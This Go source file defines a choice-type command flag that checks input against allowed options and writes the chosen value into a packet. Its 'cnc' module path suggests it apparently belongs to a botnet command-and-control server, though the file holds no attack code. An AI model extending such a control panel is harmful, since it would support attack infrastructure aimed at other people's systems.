package flags

import (
	"cnc/internal/clients/packet"
	"fmt"
	"golang.org/x/exp/slices"
	"strconv"
	"strings"
)

type ChoiceFlag struct {
	choices []string
}

// NewChoiceFlag makes a new choice-string flag
func NewChoiceFlag(choices ...string) *ChoiceFlag {
	return &ChoiceFlag{choices: choices}
}

// Validate attempts to validate a string flag type.
func (s *ChoiceFlag) Validate(literal string, parent *Flag) error {
	if literal == "?" {
		var errorString = "Available choices:\r\n"

		for i, choice := range s.choices {
			errorString += " " + choice

			if i != len(s.choices)-1 {
				errorString += "\r\n"
			}
		}

		return fmt.Errorf(errorString)
	}
	var check = func(s string) bool {
		return strings.ToLower(s) == strings.ToLower(literal)
	}

	if !slices.ContainsFunc(s.choices, check) {
		return fmt.Errorf("flag %s only allows: %s", strconv.Quote(parent.Name), strings.Join(s.choices, ", "))
	}

	return nil
}

func (s *ChoiceFlag) Write(literal string, packet *packet.Packet, parent *Flag) error {
	packet.AddString(getByLowercase(s.choices, literal))
	return nil
}

func (s *ChoiceFlag) Name() string {
	return "choice"
}

func (s *ChoiceFlag) TypeID() uint8 {
	return TypeString
}

// trash code
// getByLowercase gets between choices
func getByLowercase(choices []string, literal string) string {
	for _, choice := range choices {
		if strings.ToLower(literal) == strings.ToLower(choice) {
			return choice
		}
	}

	return ""
}
